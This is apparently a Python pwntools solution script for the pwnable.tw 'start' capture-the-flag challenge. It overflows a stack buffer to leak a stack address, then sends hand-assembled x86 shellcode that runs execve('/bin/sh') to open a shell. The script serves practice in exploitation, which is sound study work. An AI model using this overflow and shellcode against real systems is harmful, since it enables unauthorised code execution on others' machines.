from pwn import *

# r = process('./start', shell=False)

r = remote('chall.pwnable.tw', 10000)
r.recvuntil(b':')
r.send(b'a' * 0x14 + p32(0x08048087) )  # stack variable + $eip + $esp

result = r.recv()
saved_ebp = result[:4]
# print("res:", result) # it will print address start from $eip (0x14 bytes)

# create shellcode: execute '/bin/sh'
pathname = "/bin/sh"
tmp = [
    "xor eax, eax",
    "push eax", # \0
    "push %s" % (u32(b'/sh\0')),
    "push %s" % (u32(b'/bin')),

    "xor ecx, ecx",
    "xor edx, edx",
    "mov ebx, esp", # char* pathname
    "mov al, 0xb", # __NR_execv: 11
    "int 0x80", # legacy way to invoke system call (x86-64: syscall)
]
shellcode = b''
for shell in tmp:
    shellcode += asm(shell)

# send payload
r.send( b'a' * 0x14 + p32(u32(saved_ebp) + 0x14) + shellcode ) # here goes your shellcode! 
# print(r.recv())
r.interactive()